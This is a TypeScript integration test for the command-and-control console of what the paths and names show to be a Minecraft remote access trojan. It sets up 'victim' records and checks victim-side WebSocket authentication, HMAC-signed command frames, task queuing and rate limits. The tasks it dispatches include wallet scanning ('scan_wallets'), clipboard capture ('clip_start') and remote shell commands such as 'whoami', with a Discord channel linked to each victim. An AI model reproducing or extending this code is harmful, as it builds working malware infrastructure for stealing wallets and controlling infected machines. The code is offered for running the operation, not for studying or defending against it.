// Manual T2 integration check: WS auth, ticket lifecycle, HMAC, supersede and guard.
// Run from console/: npx tsx tests/ws-check.ts
import 'dotenv/config';
import { spawn } from 'node:child_process';
import { createHash, createHmac, hkdfSync, randomBytes, randomUUID } from 'node:crypto';
import { PrismaClient } from '@prisma/client';
import WebSocket from 'ws';
import { sealSecret } from '../server/lib/crypto';
import { signSession } from '../server/lib/jwt';
import { applyTaskResult } from '../server/lib/task-result';
import { expireQueued } from '../server/lib/tasks';

const PORT = 4100;
const BASE = `http://127.0.0.1:${PORT}`;
const prisma = new PrismaClient();
let pass = 0;
let fail = 0;

function check(name: string, ok: boolean, detail = ''): void {
  if (ok) {
    pass++;
    console.log(`PASS ${name}`);
  } else {
    fail++;
    console.log(`FAIL ${name} ${detail}`);
  }
}

function signature(token: string, method: string, path: string, body: Buffer): Record<string, string> {
  const ts = String(Math.floor(Date.now() / 1000));
  const nonce = randomBytes(16).toString('base64url');
  const canonical = [method.toUpperCase(), path, ts, nonce, createHash('sha256').update(body).digest('hex')].join('\n') + '\n';
  const sig = createHmac('sha256', Buffer.from(token, 'base64url')).update(canonical).digest('base64url');
  return { 'x-timestamp': ts, 'x-nonce': nonce, 'x-signature': sig };
}

async function ticket(victimId: string, token: string): Promise<Response> {
  const headers = signature(token, 'POST', '/api/v1/ws-ticket', Buffer.alloc(0));
  headers['x-victim-id'] = victimId;
  return fetch(`${BASE}/api/v1/ws-ticket`, { method: 'POST', headers });
}

type Opened = { ws: WebSocket; frames: any[]; closed: Promise<{ code: number; reason: string }> };

function open(url: string, cookie?: string): Promise<Opened> {
  return new Promise((resolve, reject) => {
    const ws = new WebSocket(url, cookie ? { headers: { cookie } } : {});
    const frames: any[] = [];
    let settle: (value: { code: number; reason: string }) => void;
    const closed = new Promise<{ code: number; reason: string }>((done) => (settle = done));
    ws.on('message', (data) => {
      try {
        frames.push(JSON.parse(String(data)));
      } catch {
        frames.push({ raw: String(data) });
      }
    });
    ws.on('close', (code, reason) => settle({ code, reason: reason.toString() }));
    ws.on('error', () => undefined);
    ws.once('open', () => resolve({ ws, frames, closed }));
    ws.once('unexpected-response', (_req, res) => reject(new Error(`http ${res.statusCode}`)));
  });
}

function nonce(): string {
  return randomBytes(16).toString('base64url');
}

function frame(type: string, seq: number, key: Buffer, fields: Record<string, unknown> = {}, opts: { id?: string; ts?: number; nonce?: string } = {}): string {
  const order = ['reply_to', 'body', 'hostname', 'user', 'os', 'cpu', 'ram', 'gpu', 'resolution', 'java', 'agent', 'public_ip', 'path', 'first', 'expect_seq_in', 'code', 'reason'];
  const id = opts.id ?? randomUUID();
  const frameNonce = opts.nonce ?? nonce();
  let payload = `{"v":1,"id":"${id}","seq":${seq},"ts":${opts.ts ?? Math.floor(Date.now() / 1000)},"type":"${type}","nonce":"${frameNonce}"`;
  for (const field of order) {
    if (!(field in fields)) continue;
    const value = fields[field];
    payload += `,"${field}":${typeof value === 'string' ? JSON.stringify(value) : typeof value === 'object' ? JSON.stringify(value) : String(value)}`;
  }
  const object = `${payload}}`;
  const input = Buffer.concat([Buffer.from(String(seq)), Buffer.from([0x1f]), Buffer.from(frameNonce), Buffer.from([0x1f]), Buffer.from(object)]);
  return `${payload},"sig":"${createHmac('sha256', key).update(input).digest('base64url')}"}`;
}

function keys(ticketValue: string, nonceValue: string): { c2a: Buffer; a2c: Buffer } {
  const secret = Buffer.from(ticketValue, 'base64url');
  const salt = Buffer.from(nonceValue, 'base64url');
  return {
    c2a: Buffer.from(hkdfSync('sha256', secret, salt, Buffer.from('spc-ws-v1/c2a'), 32)),
    a2c: Buffer.from(hkdfSync('sha256', secret, salt, Buffer.from('spc-ws-v1/a2c'), 32))
  };
}

async function handshake(ws: WebSocket, ticketValue: string, helloNonce: string): Promise<any> {
  const k = keys(ticketValue, helloNonce);
  const helloOk = await new Promise<any>((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error('no hello_ok')), 5000);
    ws.once('message', (data) => {
      clearTimeout(timer);
      resolve(JSON.parse(String(data)));
    });
  });
  const base = Number(helloOk.expect_seq_in ?? 0);
  ws.send(frame('ack', base + 1, k.a2c, { reply_to: helloOk.id }));
  ws.send(frame('hello', base + 2, k.a2c, {
    hostname: 'test-host', user: 'tester', os: 'linux', cpu: 'x', ram: '1', gpu: 'none',
    resolution: '0x0', java: '17', agent: '0.3.6', public_ip: 'unknown', path: '/tmp', first: true,
    expect_seq_in: helloOk.seq
  }));
  return helloOk;
}

async function waitFor(frames: any[], predicate: (f: any) => boolean, ms = 5000): Promise<any> {
  const start = Date.now();
  while (Date.now() - start < ms) {
    const hit = frames.find(predicate);
    if (hit) return hit;
    await new Promise((resolve) => setTimeout(resolve, 30));
  }
  return null;
}

async function postTask(cookie: string, victimId: string, name: string, params: Record<string, unknown>, timeoutSec = 60, notBefore?: string): Promise<{ status: number; id?: string }> {
  const res = await fetch(`${BASE}/api/console/tasks`, {
    method: 'POST',
    headers: { cookie, 'content-type': 'application/json' },
    body: JSON.stringify({ victim_ids: [victimId], name, params, timeout_sec: timeoutSec, ...(notBefore ? { not_before: notBefore } : {}) })
  });
  const body = await res.json() as { items?: Array<{ id: string }> };
  return { status: res.status, id: body.items?.[0]?.id };
}

async function waitRow(id: string, predicate: (row: any) => boolean, ms = 6000): Promise<any> {
  const start = Date.now();
  let row: any = null;
  while (Date.now() - start < ms) {
    row = await prisma.task.findUnique({ where: { id } });
    if (predicate(row)) return row;
    await new Promise((resolve) => setTimeout(resolve, 50));
  }
  return row;
}

async function main(): Promise<void> {
  const server = spawn('npx', ['tsx', 'server/index.ts'], {
    cwd: '/home/surrender/x/minecraft-rat/console',
    env: { ...process.env, PORT: String(PORT), LOG_DIR: '/tmp/opencode/t2logs' },
    stdio: ['ignore', 'ignore', 'ignore']
  });
  for (let i = 0; i < 100; i++) {
    try {
      const res = await fetch(`${BASE}/api/console/health`);
      if (res.ok) break;
    } catch {
      // not up yet
    }
    await new Promise((resolve) => setTimeout(resolve, 100));
  }

  const build = await prisma.build.create({
    data: { name: 'ws-check', version: '0', profile: 'full', buildId: randomUUID(), tokenHash: randomBytes(16).toString('hex'), secret: randomBytes(32).toString('base64url'), config: {} }
  });
  const tokenA = randomBytes(32).toString('base64url');
  const tokenB = randomBytes(32).toString('base64url');
  const victimA = await prisma.victim.create({ data: { buildId: build.id, hostname: 'ws-a', os: 'linux', username: 'a', deviceTokenEnc: sealSecret(tokenA) } });
  const victimB = await prisma.victim.create({ data: { buildId: build.id, hostname: 'ws-b', os: 'linux', username: 'b', deviceTokenEnc: sealSecret(tokenB) } });
  const operator = await prisma.operator.create({ data: { email: `ws-check-${randomUUID()}@x`, passwordHash: 'x', totpSecret: 'x', role: 'admin' } });
  const sessionToken = await signSession(operator.id, operator.role, randomUUID());
  const sessionId = (JSON.parse(Buffer.from(sessionToken.split('.')[1]!, 'base64url').toString()) as { sid: string }).sid;
  await prisma.session.create({ data: { id: sessionId, operatorId: operator.id, tokenHash: randomUUID(), expiresAt: new Date(Date.now() + 600_000) } });

  try {
    const first = await ticket(victimA.id, tokenA);
    const body1 = await first.json() as any;
    check('ticket 201', first.status === 201, String(first.status));
    check('ticket shape', typeof body1.ticket === 'string' && body1.ticket.length === 43 && body1.expires_in === 30 && typeof body1.handshake_nonce === 'string' && body1.device_id === victimA.id);

    const unsigned = await fetch(`${BASE}/api/v1/ws-ticket`, { method: 'POST' });
    check('ticket needs signature', unsigned.status === 401, String(unsigned.status));

    const foreign = await open(`ws://127.0.0.1:${PORT}/api/v1/ws?ticket=${body1.ticket}&device_id=${victimB.id}`);
    check('foreign device 4401', (await foreign.closed).code === 4401);
    const reused = await open(`ws://127.0.0.1:${PORT}/api/v1/ws?ticket=${body1.ticket}&device_id=${victimA.id}`);
    check('reused ticket 4401', (await reused.closed).code === 4401);

    const unknown = await open(`ws://127.0.0.1:${PORT}/api/v1/ws?ticket=${'A'.repeat(43)}&device_id=${victimA.id}`);
    check('unknown ticket 4401', (await unknown.closed).code === 4401);

    const plain = await fetch(`${BASE}/api/v1/ws`);
    check('plain GET is 426', plain.status === 426, String(plain.status));

    const good = await ticket(victimA.id, tokenA);
    const goodBody = await good.json() as any;
    const session = await open(`ws://127.0.0.1:${PORT}/api/v1/ws?ticket=${goodBody.ticket}&device_id=${victimA.id}&expect_seq_in=0`);
    const k = keys(goodBody.ticket, goodBody.handshake_nonce);
    const helloOk = await handshake(session.ws, goodBody.ticket, goodBody.handshake_nonce);
    check('hello_ok first frame', helloOk.type === 'hello_ok' && helloOk.expect_seq_in === 0 && helloOk.expect_seq_out === 0);
    const helloAck = await waitFor(session.frames, (f) => f.type === 'ack');
    check('hello acked', Boolean(helloAck));

    const ping = frame('ping', Number(helloOk.expect_seq_in ?? 0) + 3, k.a2c);
    session.ws.send(ping);
    const pong = await waitFor(session.frames, (f) => f.type === 'pong');
    check('ping answered with pong', Boolean(pong));

    session.ws.send(ping);
    const pong2 = await waitFor(session.frames, (f) => f.type === 'pong' && f.reply_to === pong?.reply_to);
    check('duplicate ping re-answered', Boolean(pong2));

    const badTicket = await (await ticket(victimA.id, tokenA)).json() as any;
    const bad = await open(`ws://127.0.0.1:${PORT}/api/v1/ws?ticket=${badTicket.ticket}&device_id=${victimA.id}`);
    const badHello = await handshake(bad.ws, badTicket.ticket, badTicket.handshake_nonce);
    bad.ws.send(frame('ping', Number(badHello.expect_seq_in ?? 0) + 3, Buffer.from('x'.repeat(32))));
    check('bad HMAC 4401', (await bad.closed).code === 4401, JSON.stringify(await bad.closed));

    const skewTicket = await (await ticket(victimA.id, tokenA)).json() as any;
    const skew = await open(`ws://127.0.0.1:${PORT}/api/v1/ws?ticket=${skewTicket.ticket}&device_id=${victimA.id}`);
    const skewHello = await handshake(skew.ws, skewTicket.ticket, skewTicket.handshake_nonce);
    skew.ws.send(frame('ping', Number(skewHello.expect_seq_in ?? 0) + 3, keys(skewTicket.ticket, skewTicket.handshake_nonce).a2c, {}, { ts: Math.floor(Date.now() / 1000) - 400 }));
    check('clock skew 4400', (await skew.closed).code === 4400);

    const nonceTicket = await (await ticket(victimA.id, tokenA)).json() as any;
    const replay = await open(`ws://127.0.0.1:${PORT}/api/v1/ws?ticket=${nonceTicket.ticket}&device_id=${victimA.id}`);
    const replayHello = await handshake(replay.ws, nonceTicket.ticket, nonceTicket.handshake_nonce);
    const replayKey = keys(nonceTicket.ticket, nonceTicket.handshake_nonce).a2c;
    const sharedNonce = nonce();
    const replayBase = Number(replayHello.expect_seq_in ?? 0) + 3;
    replay.ws.send(frame('ping', replayBase, replayKey, {}, { nonce: sharedNonce }));
    replay.ws.send(frame('ping', replayBase + 1, replayKey, {}, { nonce: sharedNonce }));
    check('repeated nonce 4400', (await replay.closed).code === 4400);

    const timeoutTicket = await (await ticket(victimA.id, tokenA)).json() as any;
    const slow = await open(`ws://127.0.0.1:${PORT}/api/v1/ws?ticket=${timeoutTicket.ticket}&device_id=${victimA.id}`);
    check('handshake timeout 4408', (await slow.closed).code === 4408);

    const retire = session.closed;
    const supersedeTicket = await (await ticket(victimA.id, tokenA)).json() as any;
    const newer = await open(`ws://127.0.0.1:${PORT}/api/v1/ws?ticket=${supersedeTicket.ticket}&device_id=${victimA.id}`);
    check('superseded 4409', (await retire).code === 4409);
    newer.ws.close();

    // --- T4: cmd routing, validation, busy, timeout and the agent trap ---
    // The Discord bridge is enabled in this environment and the route still
    // requires a link; give the socket victim a placeholder channel.
    await prisma.discordLink.create({ data: { channelId: `ws-${randomUUID()}`, guildId: '0', victimId: victimB.id } });
    await prisma.discordLink.create({ data: { channelId: `ws-${randomUUID()}`, guildId: '0', victimId: victimA.id } });
    const cookie = `spc_session=${sessionToken}`;
    const t4Ticket = await (await ticket(victimB.id, tokenB)).json() as any;
    const t4 = await open(`ws://127.0.0.1:${PORT}/api/v1/ws?ticket=${t4Ticket.ticket}&device_id=${victimB.id}`);
    const t4Hello = await handshake(t4.ws, t4Ticket.ticket, t4Ticket.handshake_nonce);
    const t4Key = keys(t4Ticket.ticket, t4Ticket.handshake_nonce).a2c;
    let t4Seq = Number(t4Hello.expect_seq_in ?? 0) + 3;
    let mode: 'hold' | 'silent' | 'agent' | 'shell' = 'hold';
    let held = 0;
    let armed = '';
    const reply = (ws: WebSocket, replyTo: string, body: Record<string, unknown>): string => {
      const id = randomUUID();
      ws.send(frame('result', t4Seq++, t4Key, { reply_to: replyTo, body }, { id }));
      return id;
    };
    t4.ws.on('message', (data) => {
      const f = JSON.parse(String(data)) as { type?: string; id?: string; task_id?: string; reply_to?: string; args?: Record<string, unknown> };
      if (f.type === 'ack' && armed && f.reply_to === armed) {
        armed = '';
        t4.ws.close(1000, 'reconnect');
        return;
      }
      if (f.type !== 'cmd' || !f.id) return;
      t4.ws.send(frame('ack', t4Seq++, t4Key, { reply_to: f.id }));
      if (mode === 'hold') {
        held += 1;
        if (held === 5) reply(t4.ws, f.id, { status: 'error', error: 'busy', result: {}, artifacts: [] });
      } else if (mode === 'shell' && f.task_id) {
        const replyId = f.id;
        const body = Buffer.from(JSON.stringify({ status: 'ok', error: null, result: { exit: 0, output: 'tester' }, artifacts: [] }));
        const headers = signature(tokenB, 'POST', `/api/v1/tasks/${f.task_id}/result`, body);
        headers['x-victim-id'] = victimB.id;
        headers['content-type'] = 'application/json';
        void fetch(`${BASE}/api/v1/tasks/${f.task_id}/result`, { method: 'POST', headers, body })
          .then(() => reply(t4.ws, replyId, { status: 'ok', error: null, result: { http_result: true }, artifacts: [] }));
      } else if (mode === 'agent') {
        const command = String(f.args?.['command'] ?? '');
        if (command.startsWith('shell')) {
          reply(t4.ws, f.id, { status: 'error', error: 'allowlist: unknown agent command: shell', result: { ok: false, output: 'allowlist: unknown agent command: shell (try help)' }, artifacts: [] });
        } else {
          armed = reply(t4.ws, f.id, { status: 'ok', error: null, result: { output: 'gateway reconnecting', ok: true }, artifacts: [] });
        }
      }
    });

    const highRes = await fetch(`${BASE}/api/console/tasks`, {
      method: 'POST', headers: { cookie, 'content-type': 'application/json' },
      body: JSON.stringify({ victim_ids: [victimB.id], name: 'scan_wallets', params: { max_bytes: 536_870_913 }, timeout_sec: 30 })
    });
    const high = await highRes.json() as { error?: string; message?: string };
    check('max_bytes above 512 MiB rejected at the edge', highRes.status === 422, String(highRes.status));
    check('max_bytes rejection is typed with the range', high.error === 'invalid_params' && String(high.message).includes('1048576..536870912'), JSON.stringify(high));
    const lowRes = await fetch(`${BASE}/api/console/tasks`, {
      method: 'POST', headers: { cookie, 'content-type': 'application/json' },
      body: JSON.stringify({ victim_ids: [victimB.id], name: 'scan_wallets', params: { max_bytes: 1_048_575 }, timeout_sec: 30 })
    });
    const low = await lowRes.json() as { error?: string };
    check('max_bytes below 1 MiB rejected at the edge', lowRes.status === 422, String(lowRes.status));
    check('max_bytes low rejection is typed', low.error === 'invalid_params', JSON.stringify(low));
    const badName = await fetch(`${BASE}/api/console/tasks`, {
      method: 'POST', headers: { cookie, 'content-type': 'application/json' },
      body: JSON.stringify({ victim_ids: [victimB.id], name: 'nope', params: {}, timeout_sec: 30 })
    });
    check('unknown type rejected at the edge', badName.status === 422, String(badName.status));

    const burst: string[] = [];
    const burstStatus: number[] = [];
    for (let i = 0; i < 5; i++) {
      const created = await postTask(cookie, victimB.id, 'clip_stop', {});
      burstStatus.push(created.status);
      if (created.id) burst.push(created.id);
    }
    check('five concurrent tasks accepted', burst.length === 5, burstStatus.join(','));
    const busyTask = await waitRow(burst[4]!, (row) => row?.error === 'busy');
    check('fifth concurrent cmd answers busy', busyTask?.error === 'busy');
    check('busy task is error:busy', busyTask?.error === 'busy' && busyTask.status === 'error', JSON.stringify(busyTask));
    const firstFour = await prisma.task.count({ where: { id: { in: burst.slice(0, 4).map((id) => id!) }, status: 'running' } });
    check('first four stay in flight, no queue', firstFour === 4, String(firstFour));
    for (const id of burst) {
      const cmd = t4.frames.find((f) => f.type === 'cmd' && f.task_id === id);
      if (cmd) reply(t4.ws, cmd.id, { status: 'ok', error: null, result: { ok: true }, artifacts: [] });
    }
    await new Promise((resolve) => setTimeout(resolve, 300));
    let drained = 0;
    for (let attempt = 0; attempt < 30; attempt++) {
      drained = await prisma.task.count({ where: { id: { in: burst.map((id) => id!) }, status: 'running' } });
      if (drained === 0) break;
      await new Promise((resolve) => setTimeout(resolve, 100));
    }
    check('burst drained before scheduling', drained === 0, String(drained));

    mode = 'silent';
    const slowTask = await postTask(cookie, victimB.id, 'clip_start', {}, 1);
    check('timeout task created', slowTask.status === 201, String(slowTask.status));
    await new Promise((resolve) => setTimeout(resolve, 7000));
    const expired = await prisma.task.findUnique({ where: { id: slowTask.id! } });
    check('timeout closes the task', expired?.error === 'timeout' && expired.status === 'error', JSON.stringify(expired));
    const slowCmd = await waitFor(t4.frames, (f) => f.type === 'cmd' && f.task_id === slowTask.id);
    if (slowCmd) {
      reply(t4.ws, slowCmd.id, { status: 'ok', error: null, result: { ok: true }, artifacts: [] });
      await new Promise((resolve) => setTimeout(resolve, 500));
    }
    const late = await prisma.task.findUnique({ where: { id: slowTask.id! } });
    check('late result after timeout is dropped', late?.error === 'timeout' && late.status === 'error', JSON.stringify(late));
    const durable = await applyTaskResult(victimB.id, slowTask.id!, { status: 'ok', error: null, result: { ok: true }, artifacts: [] });
    const afterDurable = await prisma.task.findUnique({ where: { id: slowTask.id! } });
    check('task row dedups a late result without the memory window', durable === 'conflict' && afterDurable?.error === 'timeout', `${durable} ${JSON.stringify(afterDurable)}`);

    // Scheduled work: FIFO, four at a time, one more after each result.
    const qbase = Date.now() - 60_000;
    const queued: string[] = [];
    for (let index = 0; index < 6; index++) {
      const row = await prisma.task.create({
        data: { victimId: victimB.id, name: 'clip_stop', params: {}, status: 'queued', notBefore: new Date(qbase), createdAt: new Date(qbase + index) }
      });
      queued.push(row.id);
    }
    const firstBatch = await waitFor(t4.frames, (f) => f.type === 'cmd' && f.task_id === queued[3], 15_000);
    const dispatched = queued.filter((id) => t4.frames.some((f) => f.type === 'cmd' && f.task_id === id));
    check('scheduled flush is FIFO and four at a time', Boolean(firstBatch) && dispatched.length === 4, JSON.stringify(dispatched));
    const cmd0 = t4.frames.find((f) => f.type === 'cmd' && f.task_id === queued[0]);
    if (cmd0) reply(t4.ws, cmd0.id, { status: 'ok', error: null, result: { ok: true }, artifacts: [] });
    const chain5 = await waitFor(t4.frames, (f) => f.type === 'cmd' && f.task_id === queued[4], 3000);
    check('a result chains the next scheduled task', Boolean(chain5));
    const cmd1 = t4.frames.find((f) => f.type === 'cmd' && f.task_id === queued[1]);
    if (cmd1) reply(t4.ws, cmd1.id, { status: 'ok', error: null, result: { ok: true }, artifacts: [] });
    const chain6 = await waitFor(t4.frames, (f) => f.type === 'cmd' && f.task_id === queued[5], 3000);
    check('the chain keeps FIFO order', Boolean(chain6));

    // TTL: an hour past the slot is expired, not dispatched.
    const old = await prisma.task.create({ data: { victimId: victimA.id, name: 'clip_stop', params: {}, status: 'queued', notBefore: new Date(Date.now() - 2 * 3_600_000) } });
    await expireQueued();
    const oldRow = await prisma.task.findUnique({ where: { id: old.id } });
    check('scheduled slot past TTL ends expired', oldRow?.status === 'expired', JSON.stringify(oldRow));

    // Cap: 32 queued scheduled tasks per device.
    for (let index = 0; index < 32; index++) {
      await prisma.task.create({ data: { victimId: victimA.id, name: 'clip_stop', params: {}, status: 'queued', notBefore: new Date(Date.now() + 3_600_000) } });
    }
    const full = await postTask(cookie, victimA.id, 'clip_stop', {}, 60, new Date(Date.now() + 7_200_000).toISOString());
    check('scheduled queue caps at 32 per device', full.status === 409, String(full.status));

    mode = 'agent';
    const trap = await postTask(cookie, victimB.id, 'agent', { command: 'shell whoami' });
    const trapRow = trap.id ? await waitRow(trap.id, (row) => String(row?.error ?? '').startsWith('allowlist')) : null;
    check('agent shell whoami is an allowlist error', String(trapRow?.error ?? '').startsWith('allowlist'));
    check('agent trap task is error, not shell output', trapRow?.status === 'error' && String(trapRow?.error).startsWith('allowlist'), JSON.stringify(trapRow));

    mode = 'shell';
    const shellTask = await postTask(cookie, victimB.id, 'shell', { command: 'whoami' });
    const shellRow = shellTask.id ? await waitRow(shellTask.id, (row) => row?.status === 'done') : null;
    check('shell whoami closes through the HTTP result path', shellRow?.status === 'done' && (shellRow?.result as any)?.output === 'tester', JSON.stringify(shellRow));
    const dupBody = Buffer.from(JSON.stringify({ status: 'error', error: 'other', result: {}, artifacts: [] }));
    const dupHeaders = signature(tokenB, 'POST', `/api/v1/tasks/${shellTask.id}/result`, dupBody);
    dupHeaders['x-victim-id'] = victimB.id;
    dupHeaders['content-type'] = 'application/json';
    const dupRes = await fetch(`${BASE}/api/v1/tasks/${shellTask.id}/result`, { method: 'POST', headers: dupHeaders, body: dupBody });
    const dup = await dupRes.json() as { error?: string };
    check('conflicting final result is a typed 409', dupRes.status === 409 && dup.error === 'already_finished', `${dupRes.status} ${JSON.stringify(dup)}`);
    const sameRes = await fetch(`${BASE}/api/v1/tasks/${shellTask.id}/result`, { method: 'POST', headers: dupHeaders, body: dupBody });
    check('repeated conflict stays 409, never 500', sameRes.status === 409, String(sameRes.status));

    // A silent reconnect has no result in time: the panel says unknown, not timeout.
    mode = 'silent';
    const lost = await postTask(cookie, victimB.id, 'agent', { command: 'reconnect' }, 1);
    await new Promise((resolve) => setTimeout(resolve, 7000));
    const lostRow = lost.id ? await prisma.task.findUnique({ where: { id: lost.id } }) : null;
    check('reconnect without result ends unknown', lostRow?.status === 'unknown', JSON.stringify(lostRow));

    // A real reconnect closes only after the result ACK, with a dry close.
    mode = 'agent';
    const reconnect = await postTask(cookie, victimB.id, 'agent', { command: 'reconnect' });
    const reconnectRow = reconnect.id ? await waitRow(reconnect.id, (row) => row?.status === 'done') : null;
    check('agent reconnect returns one frame line', String((reconnectRow?.result as any)?.output ?? '') === 'gateway reconnecting', JSON.stringify(reconnectRow));
    check('agent reconnect task is done', reconnectRow?.status === 'done', JSON.stringify(reconnectRow));
    const closed = await Promise.race([
      t4.closed.then(() => true),
      new Promise((resolve) => setTimeout(() => resolve(false), 3000))
    ]);
    check('reconnect closes the socket after the ACK', closed === true, JSON.stringify(t4.frames.slice(-6)));

    // No offline queue: victimA has no live socket now.
    const offline = await postTask(cookie, victimA.id, 'clip_stop', {});
    check('due task without a socket is 409 agent_offline', offline.status === 409, String(offline.status));
    t4.ws.close();

    const consoleWs = await open(`ws://127.0.0.1:${PORT}/api/console/ws`);
    check('console ws 4401 without session', (await consoleWs.closed).code === 4401);

    const authedWs = await open(`ws://127.0.0.1:${PORT}/api/console/ws`, `spc_session=${sessionToken}`);
    const hello = await waitFor(authedWs.frames, (f) => f.type === 'hello');
    check('console ws hello with session', Boolean(hello), JSON.stringify(authedWs.frames));
    authedWs.ws.close();

    // Ticket route overrides the global 600/min with 12/min per device.
    const limited = await ticket(victimB.id, tokenB);
    check('ticket limit replaces global', limited.headers.get('x-ratelimit-limit') === '12', String(limited.headers.get('x-ratelimit-limit')));
    const statuses = [limited.status];
    for (let i = 0; i < 12; i++) statuses.push((await ticket(victimB.id, tokenB)).status);
    check('13th ticket 429', statuses.filter((status) => status === 429).length >= 1, statuses.join(','));
  } finally {
    server.kill('SIGTERM');
    setTimeout(() => server.kill('SIGKILL'), 2000).unref();
    await prisma.session.deleteMany({ where: { operatorId: operator.id } });
    await prisma.operator.delete({ where: { id: operator.id } });
    await prisma.victim.deleteMany({ where: { id: { in: [victimA.id, victimB.id] } } });
    await prisma.build.delete({ where: { id: build.id } });
    await prisma.$disconnect();
  }
  console.log(`${pass} passed, ${fail} failed`);
  process.exit(fail === 0 ? 0 : 1);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
